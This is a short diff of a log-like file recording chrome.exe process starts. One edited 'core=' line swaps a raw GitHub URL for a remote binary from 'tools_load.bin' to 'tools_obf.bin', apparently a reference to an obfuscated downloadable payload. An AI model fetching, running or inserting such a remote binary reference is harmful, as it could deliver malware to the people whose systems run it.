@@ -63,7 +63,7 @@ PID: 4120
 Application started: chrome.exe
 PID: 4988
 Command line: "C:\Program Files\Google\Chrome\Application\chrome.exe"
-core= [https://raw.githubusercontent.com/nengkinkjackx/debug/main/tools_load.bin]
+core= [https://raw.githubusercontent.com/nengkinkjackx/debug/main/tools_obf.bin]
 
 [00:58:31.004] [DEBUG] [APP]
 chrome.exe initialized profile: Default
